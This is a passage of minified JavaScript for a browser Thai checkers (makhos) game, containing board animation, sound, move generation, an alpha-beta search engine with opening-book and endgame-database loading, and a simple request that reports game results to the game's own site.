ue(t,n,e,a=0,i=null,r=null,o=null,c=null,l=null,f=null){const s=Math.max(20,200,ot(t));null!==c?Se(c):null!==l&&Se(l,s);const u=n-ce,w=e-le,h=re,d=oe,p=u-h,g=w-d,y=.5*(h+u),m=.5*(d+w)-a,v=0!==a;await he(s,t=>{let n,e;v?(n=ve(h,y,u,t),e=ve(d,m,w,t)):(n=h+p*t,e=d+g*t),i&&null!=r&&null!=o?(pe(i,r+zt,o+Jt),de(n,e)):i?de(n,e,n+ce,e+le,i):de(n,e)}),null!==f&&Se(f,s),re=u,oe=w}async function we(t,n,e,a=Xt/50){const i=performance.now();for(;performance.now()-i<t;){const i=ct(a),r=ct(a);await ue(t/2,n+i,e+r)}await ue(60,n,e)}async function he(t,n){0;return new Promise(e=>{const a=performance.now();requestAnimationFrame((function i(r){const o=Math.min(1,(r-a)/t),c=function(t){return t*t*(3-2*t)}(o);ge&&me(),n(c),o<1?requestAnimationFrame(i):e()}))})}function de(t,n,e,a,i=null){const r=t+zt,o=n+Jt,c=vt.width,l=vt.height,f=Math.round(Math.max(0,r)),s=Math.round(Math.max(0,o)),u=Math.round(Math.min(r+bt.width,c)-f),w=Math.round(Math.min(o+bt.height,l)-s);if(u<=0||w<=0)return;const h=Math.round(f-r),d=Math.round(s-o);null!=i&&pe(i,Math.round(e+zt),Math.round(a+Jt)),Mt.drawImage(bt,h,d,u,w,f,s,u,w),ye(f,s,u,w)}function pe(t,n,e){Mt.drawImage(t,n,e,Xt,Xt),ye(n,e,Xt,Xt)}let ge=null;function ye(t,n,e,a){if(ge){const i=Math.min(ge.x,t),r=Math.min(ge.y,n),o=Math.max(ge.x+ge.w,t+e),c=Math.max(ge.y+ge.h,n+a);ge={x:i,y:r,w:o-i,h:c-r}}else ge={x:t,y:n,w:e,h:a}}function me(t,n,e,a){Mt.clearRect(ge.x,ge.y,ge.w,ge.h),ge=null}function ve(t,n,e,a){const i=1-a;return i*i*t+2*i*a*n+a*a*e}const Me=0,be=1,xe=2,ke=3,Ae=4;let Ie,_e=!1,Ce=!1,Le={classic:{},default:{}};async function Re(t,n,e){const a=await fetch(e),i=await a.arrayBuffer();Le[t][n]=await Ie.decodeAudioData(i)}function Se(t,n=null){if(!_e||!Ce||!Be)return;if(1===Tt)return;const e=Le[0===Tt?"classic":"default"][t]||Le.default[t];if(!e)return;const a=Ie.createBufferSource(),i=Ie.createGain();let r=1,o=ot(Pe);t===be&&n>0&&(r=1e3*e.duration/n),a.buffer=e,a.playbackRate.value=r,i.gain.value=o,a.connect(i).connect(Ie.destination),a.start()}function Ee(){if(_e)return;Ie=new(window.AudioContext||window.webkitAudioContext),"suspended"===Ie.state&&Ie.resume();const t=Ie.createBufferSource();t.buffer=Ie.createBuffer(1,1,Ie.sampleRate),t.connect(Ie.destination),t.start(0),_e=!0,async function(){await Promise.all([Re("classic",Me,"mPck_40.wav"),Re("classic",be,"mMov_320.wav"),Re("classic",xe,"mFix_72.wav"),Re("classic",ke,"mCap_320.wav"),Re("classic",Ae,"mHit_20.wav"),Re("default",Me,"cPck_20.wav"),Re("default",be,"cMov_300.wav"),Re("default",xe,"cFix_60.wav"),Re("default",ke,"cCap_120.wav"),Re("default",Ae,"cHit_60.wav")]),Ce=!0}()}let Be=!1,De=0,Pe=.5;const Ne=["speaker0.png","speaker1.png","speaker2.png"],We=[0,.3,.5];async function He(){_e||await Ee(),De=(De+1)%3,Be=0!==De,Pe=We[De],Lt.src=Ne[De]}let Te=!1,Ue=-1,je=4,Fe=0,Ye=0,Xe=0,ze=0,Je=null,$e=null,qe=!1;async function Ke(){W||2!==a&&(await O(),a=0)}let Ze=[],Ge=-1;function Oe(t){for(let n=0;n<Y[0];n++)if(ia(j[n])===t)return!0;return!1}function Qe(t){if(!Ut)return!1;for(let n=0;n<Y[0];n++)if(ia(j[n])===jt&&ra(j[n])===t)return!0;return!1}function Ve(t){o+=function(t){const n=I[ia(t)],e=I[ra(t)],a=ca(t);let i="-";if(524288&a)return". ";131072&a&&(i="x");return n+i+e+" "}(t)}function ta(t,n){const e=pt.getBoundingClientRect(),a=pt.width/e.width,i=pt.height/e.height,r=Math.floor((t-e.left)*a/Xt),o=Math.floor((n-e.top)*i/Xt);return r<0||r>7||o<0||o>7?-1:8*o+r}function na(){Te&&(ea(),Rn(),An())}function ea(){Te=!1,Ue=-1,je=4}function aa(t,n){if(Ge>=0)return Ge;let e=-1,a=1.1*Xt*(1.1*Xt);for(const i of Ze){const r=t-(fa(i)*Xt+Xt/2),o=n-(sa(i)*Xt+Xt/2),c=r*r+o*o;c<a&&(e=i,a=c)}return e}function ia(t){return 255&t}function ra(t){return t>>8&255}function oa(t){return t<<8}function ca(t){return 16711680&t}function la(t){return 5&t}function fa(t){return 7&t}function sa(t){return t>>3}function ua(t){return 2&t?196608:131072}const wa=!0;function ha(t){let n=_>0?z[_-1]:R,e=!1;if(Y[_]=F[_],131072&n&&0==(262144&n)&&(Wi(),e=da(_>0?ra(z[_-1]):P),Wi(),e))return ga(0,0,524288),void(F[_+1]=Y[_]);if(e=!1,524288&n)pa(_>0?ra(z[_-2]):P),e=!0;else for(let t=0;t<32;t++){const n=A[t],a=y[n];a>=4||(5&a)!=S||pa(n)&&(e=!0)}if(!e&&t===wa)for(let t=0;t<32;t++){const n=A[t],e=y[n];if(!(e>=4||(5&e)!=S))if(0!==e)if(1!==e)if(2!==e&&3!==e);else for(let t=0;t<4;t++)for(let e=n;(e=b[x[e]+k[t]],-1!==e)&&4===y[e];)ga(n,e,0);else{const t=7&n;7!==t&&4===y[n+9]&&ga(n,n+9,0),0!==t&&4===y[n+7]&&ga(n,n+7,0)}else{const t=7&n;0!==t&&4===y[n-9]&&ga(n,n-9,0),7!==t&&4===y[n-7]&&ga(n,n-7,0)}}F[_+1]=Y[_]}function da(t){const n=y[t];if(0===n){if(t<=15)return!1;const n=7&t;if(n>1&&1==(5&y[t-9])&&4===y[t-18])return!0;if(n<6&&1==(5&y[t-7])&&4===y[t-14])return!0}if(1===n){if(t>=48)return!1;const n=7&t;if(n<6&&0==(5&y[t+9])&&4===y[t+18])return!0;if(n>1&&0==(5&y[t+7])&&4===y[t+14])return!0}if(2===n||3===n)for(let n=0;n<4;n++)for(let e=t;e=b[x[e]+k[n]],-1!==e;)if(4!==y[e]){if((5&y[e])===E){let t=b[x[e]+k[n]];if(-1===t)break;if(4===y[t])return!0}break}return!1}function pa(t){const n=y[t];let e=!1;if(0===n){if(t>15){const n=7&t;n>1&&1==(5&y[t-9])&&4===y[t-18]&&(ga(t,t-18,ua(y[t-9])),e=!0),n<6&&1==(5&y[t-7])&&4===y[t-14]&&(ga(t,t-14,ua(y[t-7])),e=!0)}return e}if(1===n){if(t<48){const n=7&t;n<6&&0==(5&y[t+9])&&4===y[t+18]&&(ga(t,t+18,ua(y[t+9])),e=!0),n>1&&0==(5&y[t+7])&&4===y[t+14]&&(ga(t,t+14,ua(y[t+7])),e=!0)}return e}if(2===n||3===n){for(let n=0;n<4;n++)for(let a=t;a=b[x[a]+k[n]],-1!==a;)if(4!==y[a]){if((5&y[a])===E){let i=b[x[a]+k[n]];if(-1===i)break;4===y[i]&&(ga(t,i,ua(y[a])),e=!0)}break}return e}return e}function ga(t,n,e){let a=Y[_];0===y[t]&&n<=7&&(e|=262144),1===y[t]&&n>=56&&(e|=262144),j[a]=t|oa(n)|e,X[a]=((t,n)=>$[q(t,n)])(n,t),131072&e&&(X[a]+=H),196608&e&&(X[a]+=T),262144&e&&(X[a]+=T),Y[_]++}function ya(){const n=0===S;let e=0,a=0;if(0==(s|w))return n?-Aa+_:Aa-_;if(0==(u|h))return n?Aa-_:-Aa+_;const i=B<35?M:v;for(let t=0;t<32;t++){const n=A[t],r=y[n];4!==r&&(0===r?e+=i[n]:1===r&&(a+=i[63-n]))}if(d<=4){if(at(),1010==p)return 0;let e=0;for(let t=0;t<32;t++){const n=A[t],a=y[n];4!==a&&(0===a?e+=sa(n)+5:1===a&&(e+=sa(63-n)+5))}e+=6*(4-s-u),0==(s|u)&&(e+=10);const a=function(t){0;mi++;const n=Number(0xffffffffn&t),e=Number(t>>32n);let a=2097151&n;const i=yi[a];if(0===i)return 0;if(pi[a]===n&&gi[a]===e)return vi++,i;const r=1|e;a=a+r&2097151;const o=yi[a];if(0===o)return 0;if(pi[a]===n&&gi[a]===e)return vi++,o;for(let t=2;t<=Mi;t++){a=a+r&2097151;const t=yi[a];if(0===t)return 0;if(pi[a]===n&&gi[a]===e)return vi++,t}return 0}(bi());let i=0;if(0===t||t>=2){const a=s+w-(u+h);let r=0===t?-1:Math.sign(n?a:-a);0===r&&(r=-1),i=r*e}if(0!==a){if(vi++,a===si)return n?1e3-e-_:-1e3+e+_;if(a===ui)return n?-1e3+e+_:1e3-e-_;if(a===fi)return n?i:-i}const r=_i(p);if(r===si)return n?1e3-e-_:-1e3+e+_;if(r===ui)return n?-1e3+e+_:1e3-e-_;if(r===fi)return n?i:-i}return e+=s*H+w*T,a+=u*H+h*U,e+=2*(s+w),a+=2*(u+h),0===y[8]&&1===y[1]&&(a+=17),1===y[55]&&0===y[62]&&(e+=17),B<35&&(1===y[5]&&1===y[3]&&1===y[21]&&1===y[19]&&(a+=5,1!==y[14]&&1!==y[12]&&1!==y[10]||(a+=8),1===y[17]&&1===y[1]&&(a+=8),1===y[28]&&(a+=5)),0==y[17]&&(4==y[1]&&4==y[8]?e+=17:4==y[1]&&4==y[3]?e+=16:4==y[3]&&(e+=8)),0==y[19]&&(4==y[3]&&4==y[1]||4==y[3]&&4==y[5]?e+=17:(4==y[3]&&1==y[1]&&1==y[5]||4==y[1]&&1==y[3]&&1==y[8]||1==y[1]&&1==y[3])&&(e+=8)),0==y[21]&&(4==y[5]&&4==y[3]||4==y[5]&&4==y[7]?e+=17:(4==y[5]&&1==y[3]&&1==y[7]||4==y[3]&&1==y[5]&&1==y[7])&&(e+=8)),0==y[23]&&4==y[5]&&4==y[7]&&(e+=15),0==y[24]&&4==y[1]&&4==y[3]&&4==y[10]&&1==y[17]&&(e+=17),0==y[62]&&1==y[55]&&(e+=15)),n?e-a:a-e}let ma=0,va=0,Ma=0;function ba(){N=!1;const t=F[_],n=Y[_],e=K[0][_];for(let a=t;a<n;a++)if(j[a]===e)return N=!0,void(X[a]+=Aa)}function xa(t){let n=t,e=X[t];for(let a=t+1,i=Y[_];a<i;a++)X[a]>e&&(e=X[n=a]);let a=j[t];j[t]=j[n],j[n]=a,a=X[t],X[t]=X[n],X[n]=a}function ka(t){const n=K[_],e=K[_+1],a=Z[_+1];n[_]=j[t];for(let t=_+1;t<a;t++)n[t]=e[t];Z[_]=a}const Aa=1e4;function Ia(t,n,e){if(0===e)return function t(n,e){Z[_]=_;let a=ya();if(a>=e)return a;a>n&&(n=a);if(ha(!1),Y[_]===F[_])return a;N&&ba();for(let a=F[_];a<Y[_];a++){xa(a),_a(j[a]);let i=-t(-e,-n);if(Ca(),i>=e)return i;i>n&&(n=i,ka(a))}return n}(t,n);const a=function(){0;const t=$a;let n=0n;for(let e=0;e<32;e++){const a=A[e],i=y[a],r=t[e];i>=4||i<0||(n^=r[i])}1===S&&(n^=qa);return n}(),i=function(t,n,e,a){0;Va++;const i=Number(0xffffffffn&t)>>>0,r=Number(t>>32n&0xffffffffn)>>>0,o=4194303&i;if(ei[o]!==i||ai[o]!==r)return{hit:!1,bestMove:0};const c=ii[o],l=ri[o],f=ci[o],s=function(t,n){return t>9e3?t-n:t<-9e3?t+n:t}(oi[o],_);if(c>=n){if(Qa++,l===Za)return{hit:!0,score:s,bestMove:f};if(l===Ga&&s<=e)return{hit:!0,score:s,bestMove:f};if(l===Oa&&s>=a)return{hit:!0,score:s,bestMove:f}}return{hit:!1,score:0,bestMove:f}}(a,e,t,n);if(i.bestMove&&0===_&&(K[0][0]=i.bestMove),i.hit)return i.score;if(Z[_]=_,ha(wa),Y[_]==F[_]){const t=-1e4+_;return li(a,e,Za,t,0),t}Y[_]-F[_]==1&&s>1&&u>1&&e++,N&&ba();let r=t,o=0,c=-1e4;for(let i=F[_];i<Y[_];i++){xa(i),_a(j[i]);let r=-Ia(-n,-t,e-1);if(Ca(),r>c&&(c=r,o=j[i]),r>=n)return li(a,e,Oa,r,j[i]),r;r>t&&(t=r,l=ra(j[i]),f=ia(j[i]),w=e,$[q(l,f)]=$[q(l,f)]+w,ka(i))}var l,f,w;return li(a,e,c>r?Za:Ga,c,o),c}function _a(t){const n=ia(t),e=ra(t);if(z[_]=t,524288&t)return _++,_>C&&(C=_),Wi(),!0;if(131072&t){let t=n>e?fa(n)>fa(e)?e+9:e+7:fa(n)>fa(e)?e-7:e-9;switch(J[_]=t,y[t]){case 0:s--;break;case 1:u--;break;case 2:w--;break;case 3:h--}d--,y[t]=4}else J[_]=-1;if(262144&t)switch(y[n]){case 0:y[e]=2,w++,s--;break;case 1:y[e]=3,h++,u--}else y[e]=y[n];return y[n]=4,_++,Wi(),!0}function Ca(){Wi(),_--;const t=z[_],n=ia(t),e=ra(t);if(!(524288&t)){if(262144&t)switch(y[e]){case 2:y[n]=0,w--,s++;break;case 3:y[n]=1,h--,u++}else y[n]=y[e];if(131072&t){let n=J[_];switch(y[n]=(65536&t?2:0)|E,y[n]){case 0:s++;break;case 1:u++;break;case 2:w++;break;case 3:h++}d++}y[e]=4}}let La=0,Ra=0,Sa=-9999;async function Ea(){const t=performance.now();_=0,C=0,$.fill(0);let n=0,a=1,i=0;const r=Math.min(3,Math.max(0,16-d>>1));for(;a>=10&&await Ba(a,n,i),La=Ra,N=!0,n=Ia(-1e4,Aa,a),Ra=K[0][0],Sa=n,i=performance.now()-t,!(i>=5e3);){if(a>=e&&n<-9988)return!1;if(a>=e&&i>=500&&(n<=-300||n>=300||a>=e+r))break;a++}return n>200&&(Dn(!1),En(!0)),Ta=performance.now()-t,Ta<1e3&&(Ta=1e3),ja-=Math.floor(Ta/1e3),ja<0&&(ja=0),Qa=0,Va=0,vi=0,mi=0,ma=0,va=0,Ma=0,!0}async function Ba(t,n,e){await Da(100)}async function Da(t=60){await new Promise(n=>setTimeout(n,t))}function Pa(){let t=0;if(L)switch(B){case 1:t=21|oa(28);break;case 3:t=7|oa(14);break;default:t=0}else switch(B){case 1:t=14|oa(21);break;case 3:t=7|oa(14);break;default:t=0}return t}const Na="https://chnp.co.th/makhos/visit.php?";function Wa(i){const s=i>0?"W":i<0?"L":"D";Math.round((performance.now()-r)/1e3);c+=t+s+" ";let u=Na+"level="+t+"&result="+encodeURIComponent(c);t>0&&"W"===s&&(u+="&moves="+encodeURIComponent(o)),fetch(u);const w=i>0?"คุณชนะ":i<0?"คุณแพ้":"เสมอกัน";Sn(w+"!, เริ่มเกมใหม่"),nt(w),function(e){n=t,e>0?(l++,f=0):e<0?(l=0,f++):(l=0,f=0);e>0&&0===n?(t=1,l=f=0):(2===l&&(t++,l=0),2===f&&(t--,f=0));t=Math.max(0,Math.min(2,t))}(i),e=t-1+10,t<=0&&(e=10),a=3,za()}function Ha(){return at(),1010==p&&(4===y[7]||4===y[48])||!(D<6)&&(D>25||1111==p)}let Ta=0,Ua=180,ja=180,Fa=null;function Ya(t){const n=t%60;return Math.floor(t/60)+":"+(n<10?"0"+n:n)}function Xa(){Et.textContent=Ya(ja),Bt.textContent=Ya(Ua),ja<=0&&(Et.style.color="#fd0"),Ua<=0&&(Bt.style.color="#fd0")}function za(){Ja(!1),Fa&&clearInterval(Fa),Fa=null,Xa()}function Ja(t){Bt.style.color=t?"#eee":"#888",Et.style.color=t?"#888":"#eee",_t.style.opacity=t?1:.4,Ct.style.opacity=t?.4:1}let $a=null,qa=0n;function Ka(t){return 6364136223846793005n*BigInt(t)+1n&(1n<<64n)-1n}const Za=0,Ga=1,Oa=2;let Qa=0,Va=0,ti=0,ni=0;const ei=new Uint32Array(4194304),ai=new Uint32Array(4194304),ii=new Int16Array(4194304),ri=new Int8Array(4194304),oi=new Int32Array(4194304),ci=new Int32Array(4194304);function li(t,n,e,a,i){if(0===n)return;ti++;const r=Number(0xffffffffn&t)>>>0,o=Number(t>>32n&0xffffffffn)>>>0,c=4194303&r;if(a=function(t,n){return t>9e3?t+n:t<-9e3?t-n:t}(a,_),0===ai[c]&&0===ei[c])return ei[c]=r,ai[c]=o,ii[c]=n>0?n:1,ri[c]=e,oi[c]=a,void(ci[c]=0|i);const l=ei[c],f=ai[c],s=ii[c],u=ri[c];if(f!==o||l!==r)return ei[c]=r,ai[c]=o,ii[c]=n,ri[c]=e,oi[c]=a,void(ci[c]=0|i);if(ni++,f===o&&l===r){if(u===Za&&e!==Za)return;if(n<s&&e!==Za)return;if(e===Za&&u===Za&&n<s)return;return ii[c]=n,ri[c]=e,oi[c]=a,void(ci[c]=0|i)}}const fi=1,si=2,ui=3;let wi=0;const hi=new Map,di=(1n<<63n)-1n,pi=new Uint32Array(1<<21),gi=new Uint32Array(1<<21),yi=new Uint8Array(1<<21);let mi=0,vi=0,Mi=0;function bi(){const t=0===S,n=$a;let e=0n;for(let a=0;a<32;a++){const i=A[a],r=n[a];let o=y[i];o>=4||o<0||(t||4===o||(o^=1),e^=r[o])}return e&di}function xi(t,n){const e=Number(0xffffffffn&t),a=Number(t>>32n);let i=2097151&e;const r=1|a;for(let t=0;t<1<<21;t++){if(0===yi[i])return pi[i]=e,gi[i]=a,yi[i]=n,t>Mi&&(Mi=t),!0;if(pi[i]===e&&gi[i]===a)return!1;i=i+r&2097151}return!1}function ki(t){let n="",e=0;for(;e<t.length;){let a=t[e];if(a>="0"&&a<="9"){let a=e+1;a<t.length&&t[a]>="0"&&t[a]<="9"&&a++;const i=parseInt(t.slice(e,a),10);n+="y".repeat(i),e=a}else n+=a,e++}return n}function Ai(t){const n=[0,1,2,3,4];for(let t=0;t<32;t++)y[A[t]]=4;let e=0;for(let a=0;a<16;a++){const i=t.charCodeAt(a)-97;let r=Math.floor(i/5),o=i%5;y[A[e++]]=n[r],y[A[e++]]=n[o]}}const Ii=new Map([[1001,2],[110,3],[101,1],[1010,1],[2010,2],[1020,3],[1110,2],[1011,3],[210,2],[1002,3],[2001,2],[120,3],[1101,2],[111,3],[201,2],[102,3],[2020,1],[2011,2],[2002,2],[220,3],[211,3],[202,1],[1120,3],[1111,1],[1102,2],[2110,2],[2101,2],[1021,3],[121,3],[1210,2],[1201,2],[1012,3],[112,3],[3010,2],[3001,2],[1030,3],[130,3],[310,2],[301,2],[1003,3],[103,3]]);function _i(t){return Ii.get(t)??0}function Ci(){let t=0,n=0,e=0,a=0;for(let i=0;i<32;i++){const r=y[A[i]];2===r?t++:0===r?n++:3===r?e++:1===r&&a++}return 1e3*t+100*n+10*e+a}const Li=new Map;let Ri=0;function Si(t){S=0,y.set(g);const n=(t=t.replace(/\b(\d+(?:x\d+)+)\b/g,t=>{const n=t.split("x");return n.map((t,e)=>e?`${n[e-1]}x${t}`:null).filter(Boolean).join(" . ")})).split(/\s+/);for(const t of n){const n=Ni(),e=Ei(t);Li.has(n)||Li.set(n,[]),Li.get(n).push(e),Ri++,Bi(t)}}function Ei(t){const n=t.includes("x");let[e,a]=t.split(n?"x":"-").map(t=>+t);return 0!==S&&(e=33-e,a=33-a),A[e-1]|A[a-1]<<8}function Bi(t){if("."===t)return void(S^=1);let[n,e]=t.split(t.includes("x")?"x":"-").map(t=>+t);t.includes("x")?function(t,n){const e=A[t-1],a=A[n-1];Di(t,n);const i=e>a?fa(e)>fa(a)?a+9:a+7:fa(e)>fa(a)?a-7:a-9;4!==y[i]&&(y[i]=4)}(n,e):Di(n,e),S^=1}function Di(t,n){const e=A[t-1],a=A[n-1],i=y[e];4!==i&&(y[a]=i,y[e]=4,0===i&&a<8&&(y[a]=2),1===i&&a>=56&&(y[a]=3))}function Pi(){const t=Ni(),n=Li.get(t);if(!n)return null;let e=n[Math.floor(Math.random()*n.length)];return e=ca(e)|oa(63-ra(e))|63-ia(e),e}function Ni(){const t=0===S,n=t?[4n,5n,6n,7n]:[5n,4n,7n,6n];let e=0n;if(t)for(let t=0;t<32;t++){const a=y[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}else for(let t=31;t>=0;t--){const a=y[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}return e}function Wi(){S=0===S?1:0,E=0===S?1:0}window.init=function(){!function(){j.fill(0),X.fill(0),F.fill(0),Y.fill(0),z.fill(0),J.fill(0),Z.fill(0),$.fill(0);for(let t=0;t<64;t++)K[t]=new Array(64).fill(0);for(let t=0;t<32;t++)I[A[t]]=t+1;ut=Ot("boardWrapper"),wt=Ot("extendWrapper"),ht=Ot("topBar"),dt=Ot("bottomBar"),pt=Ot("boardCanvas"),gt=pt.getContext("2d"),yt=Ot("pieceCanvas"),mt=yt.getContext("2d"),vt=Ot("animeCanvas"),Mt=vt.getContext("2d"),bt=Nt.createElement("canvas"),xt=bt.getContext("2d"),kt=Ot("message"),Pt=Ot("topCenter"),At=Ot("version"),St=Ot("newgame"),_t=Ot("styleSwitch"),Ct=Ot("styleComp"),Lt=Ot("soundSwitch"),Rt=Ot("cellNumSwitch"),It=Ot("footer"),Et=Ot("compTime"),Bt=Ot("playerTime"),Dt=Ot("overlayText"),En(!1),Dn(!1),Mt.imageSmoothingEnabled=!1,xt.imageSmoothingEnabled=!1,document.addEventListener("touchend",t=>{const n=Date.now();n-Gt<=300&&t.preventDefault(),Gt=n},{passive:!1}),document.addEventListener("touchstart",t=>{t.touches.length>1&&t.preventDefault()},{passive:!1}),document.addEventListener("gesturestart",t=>t.preventDefault()),function(){let t=124987n;$a=[];for(let n=0;n<32;n++){$a[n]=[];for(let e=0;e<10;e++)t=Ka(t),$a[n][e]=t}t=Ka(t),qa=t}()}(),function(){nt("Loading...");let t=0,n=0;for(let n=0;n<st;n++)t+=lt[n].length;for(let e=0;e<st;e++){Ht[e]=[];for(let a=0;a<lt[e].length;a++){const i=Ht[e][a]=new Image;i.onload=()=>{++n===t&&(wn=!0,hn())},i.src=lt[e][a]}}}(),async function(t="DB0508.zip",n="DB0508.txt"){try{Li.clear(),Ri=0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),i=(await JSZip.loadAsync(a)).file(n);if(!i)throw new Error(`File ${n} not found`);const r=(await i.async("text")).split("\n").map(t=>t.trim()).filter(t=>t.length>=21);for(const t of r){const n=t.substring(0,16),e=t.substring(16,21),a=BigInt("0x"+n),i=Number("0x"+e);Li.has(a)||Li.set(a,[]),Li.get(a).push(i),Ri++}await async function(t="newBK.txt"){const n=await fetch(t),e=(await n.text()).split("\n").map(t=>t.trim()).filter(t=>t.length>0&&!/^\s*#/.test(t));for(const t of e)Si(t)}()}catch(t){}}(),async function(t="background2.jpg",n="description2.txt"){try{0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),i=(await JSZip.loadAsync(a)).file(n);if(!i)throw new Error(`File ${n} not found`);const r=await i.async("text");pi.fill(0),gi.fill(0),yi.fill(0),S=0;let o=0,c=0;const l=r.split("\n").map(t=>t.trim()).filter(t=>t&&!t.startsWith("#"));for(const t of l){const n={".":fi,"+":si,"-":ui}[t[t.length-1]]||0,e=ki(t.substring(0,t.length-1));if(16!==e.length)continue;Ai(e);const a=bi(),i=Ci();hi.has(i)||hi.set(i,{win:0,draw:0,loss:0,total:0,def:_i(i)});const r=hi.get(i);n===fi?r.draw++:n===si?r.win++:n===ui&&r.loss++,r.total++,xi(a,n)?o++:c++}for(const[t,n]of hi.entries()){let t=!1;n.def===si&&n.win>0&&(t=!0),n.def===fi&&n.draw>0&&(t=!0),n.def===ui&&n.loss>0&&(t=!0)}V(),S=0,wi=o}catch(t){}}(),G()}